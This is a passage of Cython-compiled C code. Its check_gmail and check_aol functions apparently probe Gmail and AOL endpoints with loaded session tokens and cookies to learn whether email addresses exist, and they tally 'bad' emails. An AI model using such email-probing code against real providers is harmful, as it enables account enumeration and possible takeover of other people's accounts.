              __Pyx_GIVEREF(__pyx_t_6); PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_t_6); __pyx_t_6 = NULL;
            }
            __Pyx_INCREF(__pyx_v_username);
            __Pyx_GIVEREF(__pyx_v_username);
            PyTuple_SET_ITEM(__pyx_t_7, 0+__pyx_t_13, __pyx_v_username);
            __Pyx_INCREF(__pyx_v_gg);
            __Pyx_GIVEREF(__pyx_v_gg);
            PyTuple_SET_ITEM(__pyx_t_7, 1+__pyx_t_13, __pyx_v_gg);
            __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_16, __pyx_t_7, NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 425, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          }
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        }
        __pyx_L21:;

        
        goto __pyx_L20;
      }

      
      /*else*/ {
        __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_bademail); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 427, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_16 = __Pyx_PyInt_AddObjC(__pyx_t_12, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 427, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_bademail, __pyx_t_16) < 0) __PYX_ERR(0, 427, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_pppp); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 428, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_7 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_12))) {
          __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_12);
          if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_12, function);
          }
        }
        __pyx_t_16 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_12);
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 428, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
      }
      __pyx_L20:;

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
    __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
    __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
    __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;

    
    __pyx_t_13 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
    if (__pyx_t_13) {
      __Pyx_ErrRestore(0,0,0);
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_12);
  __Pyx_XDECREF(__pyx_t_14);
  __Pyx_XDECREF(__pyx_t_15);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_AddTraceback("source.check_gmail", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_o);
  __Pyx_XDECREF(__pyx_v_tl);
  __Pyx_XDECREF(__pyx_v_host);
  __Pyx_XDECREF(__pyx_v_cookies);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_params);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_ok);
  __Pyx_XDECREF(__pyx_v_username);
  __Pyx_XDECREF(__pyx_v_gg);
  __Pyx_XDECREF(__pyx_v_email);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_19check_aol(PyObject *__pyx_self, PyObject *__pyx_v_email); /*proto*/
static PyMethodDef __pyx_mdef_6source_19check_aol = {"check_aol", (PyCFunction)__pyx_pw_6source_19check_aol, METH_O, 0};
static PyObject *__pyx_pw_6source_19check_aol(PyObject *__pyx_self, PyObject *__pyx_v_email) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("check_aol (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_18check_aol(__pyx_self, ((PyObject *)__pyx_v_email));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_18check_aol(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_email) {
  PyObject *__pyx_v_name = NULL;
  PyObject *__pyx_v_f = NULL;
  PyObject *__pyx_v_line = NULL;
  PyObject *__pyx_v_specData = NULL;
  PyObject *__pyx_v_specId = NULL;
  PyObject *__pyx_v_crumb = NULL;
  PyObject *__pyx_v_sessionIndex = NULL;
  PyObject *__pyx_v_acrumb = NULL;
  PyObject *__pyx_v_cookies = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_params = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_res = NULL;
  PyObject *__pyx_v_ok = NULL;
  PyObject *__pyx_v_username = NULL;
  PyObject *__pyx_v_gg = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  int __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  Py_ssize_t __pyx_t_17;
  PyObject *(*__pyx_t_18)(PyObject *);
  PyObject *__pyx_t_19 = NULL;
  PyObject *__pyx_t_20 = NULL;
  PyObject *__pyx_t_21 = NULL;
  PyObject *__pyx_t_22 = NULL;
  PyObject *(*__pyx_t_23)(PyObject *);
  PyObject *__pyx_t_24 = NULL;
  int __pyx_t_25;
  PyObject *__pyx_t_26 = NULL;
  PyObject *__pyx_t_27 = NULL;
  PyObject *__pyx_t_28 = NULL;
  Py_UCS4 __pyx_t_29;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("check_aol", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __pyx_t_4 = (__Pyx_PySequence_ContainsTF(__pyx_kp_u__39, __pyx_v_email, Py_EQ)); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 436, __pyx_L3_error)
      __pyx_t_5 = (__pyx_t_4 != 0);
      if (__pyx_t_5) {

        
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_email, __pyx_n_s_split); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 437, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_8 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_8)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_8);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
          }
        }
        __pyx_t_6 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_8, __pyx_kp_u__39) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_kp_u__39);
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 437, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = __Pyx_GetItemInt(__pyx_t_6, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 437, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_v_name = __pyx_t_7;
        __pyx_t_7 = 0;

        
        goto __pyx_L9;
      }

      
      /*else*/ {
        __Pyx_INCREF(__pyx_v_email);
        __pyx_v_name = __pyx_v_email;
      }
      __pyx_L9:;

      
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_9, &__pyx_t_10, &__pyx_t_11);
        __Pyx_XGOTREF(__pyx_t_9);
        __Pyx_XGOTREF(__pyx_t_10);
        __Pyx_XGOTREF(__pyx_t_11);
        /*try:*/ {

          
          /*with:*/ {
            __pyx_t_7 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 442, __pyx_L10_error)
            __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_12 = __Pyx_PyObject_LookupSpecial(__pyx_t_7, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 442, __pyx_L10_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_8 = __Pyx_PyObject_LookupSpecial(__pyx_t_7, __pyx_n_s_enter); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 442, __pyx_L16_error)
            __Pyx_GOTREF(__pyx_t_8);
            __pyx_t_13 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
              __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_8);
              if (likely(__pyx_t_13)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
                __Pyx_INCREF(__pyx_t_13);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_8, function);
              }
            }
            __pyx_t_6 = (__pyx_t_13) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_13) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
            __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
            if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 442, __pyx_L16_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_8 = __pyx_t_6;
            __pyx_t_6 = 0;
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            /*try:*/ {
              {
                __Pyx_PyThreadState_declare
                __Pyx_PyThreadState_assign
                __Pyx_ExceptionSave(&__pyx_t_14, &__pyx_t_15, &__pyx_t_16);
                __Pyx_XGOTREF(__pyx_t_14);
                __Pyx_XGOTREF(__pyx_t_15);
                __Pyx_XGOTREF(__pyx_t_16);
                /*try:*/ {
                  __pyx_v_f = __pyx_t_8;
                  __pyx_t_8 = 0;

                  
                  if (likely(PyList_CheckExact(__pyx_v_f)) || PyTuple_CheckExact(__pyx_v_f)) {
                    __pyx_t_8 = __pyx_v_f; __Pyx_INCREF(__pyx_t_8); __pyx_t_17 = 0;
                    __pyx_t_18 = NULL;
                  } else {
                    __pyx_t_17 = -1; __pyx_t_8 = PyObject_GetIter(__pyx_v_f); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 443, __pyx_L20_error)
                    __Pyx_GOTREF(__pyx_t_8);
                    __pyx_t_18 = Py_TYPE(__pyx_t_8)->tp_iternext; if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 443, __pyx_L20_error)
                  }
                  for (;;) {
                    if (likely(!__pyx_t_18)) {
                      if (likely(PyList_CheckExact(__pyx_t_8))) {
                        if (__pyx_t_17 >= PyList_GET_SIZE(__pyx_t_8)) break;
                        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                        __pyx_t_7 = PyList_GET_ITEM(__pyx_t_8, __pyx_t_17); __Pyx_INCREF(__pyx_t_7); __pyx_t_17++; if (unlikely(0 < 0)) __PYX_ERR(0, 443, __pyx_L20_error)
                        #else
                        __pyx_t_7 = PySequence_ITEM(__pyx_t_8, __pyx_t_17); __pyx_t_17++; if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 443, __pyx_L20_error)
                        __Pyx_GOTREF(__pyx_t_7);
                        #endif
                      } else {
                        if (__pyx_t_17 >= PyTuple_GET_SIZE(__pyx_t_8)) break;
                        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                        __pyx_t_7 = PyTuple_GET_ITEM(__pyx_t_8, __pyx_t_17); __Pyx_INCREF(__pyx_t_7); __pyx_t_17++; if (unlikely(0 < 0)) __PYX_ERR(0, 443, __pyx_L20_error)
                        #else
                        __pyx_t_7 = PySequence_ITEM(__pyx_t_8, __pyx_t_17); __pyx_t_17++; if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 443, __pyx_L20_error)
                        __Pyx_GOTREF(__pyx_t_7);
                        #endif
                      }
                    } else {
                      __pyx_t_7 = __pyx_t_18(__pyx_t_8);
                      if (unlikely(!__pyx_t_7)) {
                        PyObject* exc_type = PyErr_Occurred();
                        if (exc_type) {
                          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                          else __PYX_ERR(0, 443, __pyx_L20_error)
                        }
                        break;
                      }
                      __Pyx_GOTREF(__pyx_t_7);
                    }
                    __Pyx_XDECREF_SET(__pyx_v_line, __pyx_t_7);
                    __pyx_t_7 = 0;

                    
                    __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_v_line, __pyx_n_s_strip); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 444, __pyx_L20_error)
                    __Pyx_GOTREF(__pyx_t_13);
                    __pyx_t_19 = NULL;
                    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_13))) {
                      __pyx_t_19 = PyMethod_GET_SELF(__pyx_t_13);
                      if (likely(__pyx_t_19)) {
                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
                        __Pyx_INCREF(__pyx_t_19);
                        __Pyx_INCREF(function);
                        __Pyx_DECREF_SET(__pyx_t_13, function);
                      }
                    }
                    __pyx_t_6 = (__pyx_t_19) ? __Pyx_PyObject_CallOneArg(__pyx_t_13, __pyx_t_19) : __Pyx_PyObject_CallNoArg(__pyx_t_13);
                    __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
                    if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 444, __pyx_L20_error)
                    __Pyx_GOTREF(__pyx_t_6);
                    __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
                    __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_split); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 444, __pyx_L20_error)
                    __Pyx_GOTREF(__pyx_t_13);
                    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                    __pyx_t_6 = NULL;
                    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_13))) {
                      __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_13);
                      if (likely(__pyx_t_6)) {
                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
                        __Pyx_INCREF(__pyx_t_6);
                        __Pyx_INCREF(function);
                        __Pyx_DECREF_SET(__pyx_t_13, function);
                      }
                    }
                    __pyx_t_7 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_13, __pyx_t_6, __pyx_n_u__37) : __Pyx_PyObject_CallOneArg(__pyx_t_13, __pyx_n_u__37);
                    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                    if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 444, __pyx_L20_error)
                    __Pyx_GOTREF(__pyx_t_7);
                    __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
                    if ((likely(PyTuple_CheckExact(__pyx_t_7))) || (PyList_CheckExact(__pyx_t_7))) {
                      PyObject* sequence = __pyx_t_7;
                      Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                      if (unlikely(size != 5)) {
                        if (size > 5) __Pyx_RaiseTooManyValuesError(5);
                        else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                        __PYX_ERR(0, 444, __pyx_L20_error)
                      }
                      #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                      if (likely(PyTuple_CheckExact(sequence))) {
                        __pyx_t_13 = PyTuple_GET_ITEM(sequence, 0); 
                        __pyx_t_6 = PyTuple_GET_ITEM(sequence, 1); 
                        __pyx_t_19 = PyTuple_GET_ITEM(sequence, 2); 
                        __pyx_t_20 = PyTuple_GET_ITEM(sequence, 3); 
                        __pyx_t_21 = PyTuple_GET_ITEM(sequence, 4); 
                      } else {
                        __pyx_t_13 = PyList_GET_ITEM(sequence, 0); 
                        __pyx_t_6 = PyList_GET_ITEM(sequence, 1); 
                        __pyx_t_19 = PyList_GET_ITEM(sequence, 2); 
                        __pyx_t_20 = PyList_GET_ITEM(sequence, 3); 
                        __pyx_t_21 = PyList_GET_ITEM(sequence, 4); 
                      }
                      __Pyx_INCREF(__pyx_t_13);
                      __Pyx_INCREF(__pyx_t_6);
                      __Pyx_INCREF(__pyx_t_19);
                      __Pyx_INCREF(__pyx_t_20);
                      __Pyx_INCREF(__pyx_t_21);
                      #else
                      {
                        Py_ssize_t i;
                        PyObject** temps[5] = {&__pyx_t_13,&__pyx_t_6,&__pyx_t_19,&__pyx_t_20,&__pyx_t_21};
                        for (i=0; i < 5; i++) {
                          PyObject* item = PySequence_ITEM(sequence, i); if (unlikely(!item)) __PYX_ERR(0, 444, __pyx_L20_error)
                          __Pyx_GOTREF(item);
                          *(temps[i]) = item;
                        }
                      }
                      #endif
                      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                    } else {
                      Py_ssize_t index = -1;
                      PyObject** temps[5] = {&__pyx_t_13,&__pyx_t_6,&__pyx_t_19,&__pyx_t_20,&__pyx_t_21};
                      __pyx_t_22 = PyObject_GetIter(__pyx_t_7); if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 444, __pyx_L20_error)
                      __Pyx_GOTREF(__pyx_t_22);
                      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                      __pyx_t_23 = Py_TYPE(__pyx_t_22)->tp_iternext;
                      for (index=0; index < 5; index++) {
                        PyObject* item = __pyx_t_23(__pyx_t_22); if (unlikely(!item)) goto __pyx_L28_unpacking_failed;
                        __Pyx_GOTREF(item);
                        *(temps[index]) = item;
                      }
                      if (__Pyx_IternextUnpackEndCheck(__pyx_t_23(__pyx_t_22), 5) < 0) __PYX_ERR(0, 444, __pyx_L20_error)
                      __pyx_t_23 = NULL;
                      __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;
                      goto __pyx_L29_unpacking_done;
                      __pyx_L28_unpacking_failed:;
                      __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;
                      __pyx_t_23 = NULL;
                      if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                      __PYX_ERR(0, 444, __pyx_L20_error)
                      __pyx_L29_unpacking_done:;
                    }
                    __Pyx_XDECREF_SET(__pyx_v_specData, __pyx_t_13);
                    __pyx_t_13 = 0;
                    __Pyx_XDECREF_SET(__pyx_v_specId, __pyx_t_6);
                    __pyx_t_6 = 0;
                    __Pyx_XDECREF_SET(__pyx_v_crumb, __pyx_t_19);
                    __pyx_t_19 = 0;
                    __Pyx_XDECREF_SET(__pyx_v_sessionIndex, __pyx_t_20);
                    __pyx_t_20 = 0;
                    __Pyx_XDECREF_SET(__pyx_v_acrumb, __pyx_t_21);
                    __pyx_t_21 = 0;

                    
                  }
                  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

                  
                }
                __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
                __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                goto __pyx_L25_try_end;
                __pyx_L20_error:;
                __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
                __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
                __Pyx_XDECREF(__pyx_t_20); __pyx_t_20 = 0;
                __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
                __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
                __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
                /*except:*/ {
                  __Pyx_AddTraceback("source.check_aol", __pyx_clineno, __pyx_lineno, __pyx_filename);
                  if (__Pyx_GetException(&__pyx_t_8, &__pyx_t_7, &__pyx_t_21) < 0) __PYX_ERR(0, 442, __pyx_L22_except_error)
                  __Pyx_GOTREF(__pyx_t_8);
                  __Pyx_GOTREF(__pyx_t_7);
                  __Pyx_GOTREF(__pyx_t_21);
                  __pyx_t_20 = PyTuple_Pack(3, __pyx_t_8, __pyx_t_7, __pyx_t_21); if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 442, __pyx_L22_except_error)
                  __Pyx_GOTREF(__pyx_t_20);
                  __pyx_t_24 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_t_20, NULL);
                  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
                  __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;
                  if (unlikely(!__pyx_t_24)) __PYX_ERR(0, 442, __pyx_L22_except_error)
                  __Pyx_GOTREF(__pyx_t_24);
                  __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_24);
                  __Pyx_DECREF(__pyx_t_24); __pyx_t_24 = 0;
                  if (__pyx_t_5 < 0) __PYX_ERR(0, 442, __pyx_L22_except_error)
                  __pyx_t_4 = ((!(__pyx_t_5 != 0)) != 0);
                  if (__pyx_t_4) {
                    __Pyx_GIVEREF(__pyx_t_8);
                    __Pyx_GIVEREF(__pyx_t_7);
                    __Pyx_XGIVEREF(__pyx_t_21);
                    __Pyx_ErrRestoreWithState(__pyx_t_8, __pyx_t_7, __pyx_t_21);
                    __pyx_t_8 = 0; __pyx_t_7 = 0; __pyx_t_21 = 0; 
                    __PYX_ERR(0, 442, __pyx_L22_except_error)
                  }
                  __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
                  __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                  __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
                  goto __pyx_L21_exception_handled;
                }
                __pyx_L22_except_error:;
                __Pyx_XGIVEREF(__pyx_t_14);
                __Pyx_XGIVEREF(__pyx_t_15);
                __Pyx_XGIVEREF(__pyx_t_16);
                __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_15, __pyx_t_16);
                goto __pyx_L10_error;
                __pyx_L21_exception_handled:;
                __Pyx_XGIVEREF(__pyx_t_14);
                __Pyx_XGIVEREF(__pyx_t_15);
                __Pyx_XGIVEREF(__pyx_t_16);
                __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_15, __pyx_t_16);
                __pyx_L25_try_end:;
              }
            }
            /*finally:*/ {
              /*normal exit:*/{
                if (__pyx_t_12) {
                  __pyx_t_16 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_tuple__33, NULL);
                  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
                  if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 442, __pyx_L10_error)
                  __Pyx_GOTREF(__pyx_t_16);
                  __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
                }
                goto __pyx_L19;
              }
              __pyx_L19:;
            }
            goto __pyx_L33;
            __pyx_L16_error:;
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            goto __pyx_L10_error;
            __pyx_L33:;
          }

          
          /*with:*/ {
            __pyx_t_21 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__43, NULL); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 446, __pyx_L10_error)
            __Pyx_GOTREF(__pyx_t_21);
            __pyx_t_12 = __Pyx_PyObject_LookupSpecial(__pyx_t_21, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 446, __pyx_L10_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_8 = __Pyx_PyObject_LookupSpecial(__pyx_t_21, __pyx_n_s_enter); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 446, __pyx_L34_error)
            __Pyx_GOTREF(__pyx_t_8);
            __pyx_t_20 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
              __pyx_t_20 = PyMethod_GET_SELF(__pyx_t_8);
              if (likely(__pyx_t_20)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
                __Pyx_INCREF(__pyx_t_20);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_8, function);
              }
            }
            __pyx_t_7 = (__pyx_t_20) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_20) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
            __Pyx_XDECREF(__pyx_t_20); __pyx_t_20 = 0;
            if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 446, __pyx_L34_error)
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __pyx_t_8 = __pyx_t_7;
            __pyx_t_7 = 0;
            __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
            /*try:*/ {
              {
                __Pyx_PyThreadState_declare
                __Pyx_PyThreadState_assign
                __Pyx_ExceptionSave(&__pyx_t_16, &__pyx_t_15, &__pyx_t_14);
                __Pyx_XGOTREF(__pyx_t_16);
                __Pyx_XGOTREF(__pyx_t_15);
                __Pyx_XGOTREF(__pyx_t_14);
                /*try:*/ {
                  __Pyx_XDECREF_SET(__pyx_v_f, __pyx_t_8);
                  __pyx_t_8 = 0;

                  
                  if (likely(PyList_CheckExact(__pyx_v_f)) || PyTuple_CheckExact(__pyx_v_f)) {
                    __pyx_t_8 = __pyx_v_f; __Pyx_INCREF(__pyx_t_8); __pyx_t_17 = 0;
                    __pyx_t_18 = NULL;
                  } else {
                    __pyx_t_17 = -1; __pyx_t_8 = PyObject_GetIter(__pyx_v_f); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 447, __pyx_L38_error)
                    __Pyx_GOTREF(__pyx_t_8);
                    __pyx_t_18 = Py_TYPE(__pyx_t_8)->tp_iternext; if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 447, __pyx_L38_error)
                  }
                  for (;;) {
                    if (likely(!__pyx_t_18)) {
                      if (likely(PyList_CheckExact(__pyx_t_8))) {
                        if (__pyx_t_17 >= PyList_GET_SIZE(__pyx_t_8)) break;
